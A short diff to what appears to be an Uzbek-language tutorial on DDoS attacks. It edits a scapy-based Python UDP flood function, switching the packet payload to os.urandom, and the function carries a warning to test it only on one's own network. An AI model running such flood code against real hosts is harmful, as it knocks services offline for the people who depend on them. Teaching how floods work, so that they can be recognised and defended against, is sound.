@@ -34,6 +34,7 @@ Server: Bandwidth to'ldi ❌
 ```python
 from scapy.all import *
 import random
+import os
 
 def udp_flood(target_ip, target_port, count=1000):
     """UDP Flood - faqat o'z tarmog'ingizda sinang!"""
@@ -53,7 +54,7 @@ def udp_flood(target_ip, target_port, count=1000):
                 sport=random.randint(1024, 65535),
                 dport=target_port
             )
-            payload = Raw(load=RandomString(size=1024))
+            payload = Raw(load=os.urandom(1024))
             
             send(ip_layer/udp_layer/payload, verbose=False)
             sent += 1
